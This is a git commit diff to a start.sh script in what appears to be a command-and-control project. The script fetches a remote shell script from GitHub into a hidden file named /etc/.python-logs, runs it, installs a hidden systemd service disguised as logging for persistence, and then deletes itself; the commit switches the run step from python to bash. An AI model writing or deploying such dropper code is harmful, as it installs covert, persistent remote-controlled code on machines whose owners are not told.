4de1fe4d3232ba97c360804b5aa8d41149e0f11c
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-25 22:25:08 -0500

    Change script execution from Python to Bash

--- start.sh
+++ start.sh
@@ -1,5 +1,5 @@
 curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh > /etc/.python-logs
 chmod +x /etc/.python-logs
-python /etc/.python-logs
+bash /etc/.python-logs
 curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service > /etc/systemd/system/.python-logs.service
 rm start.sh
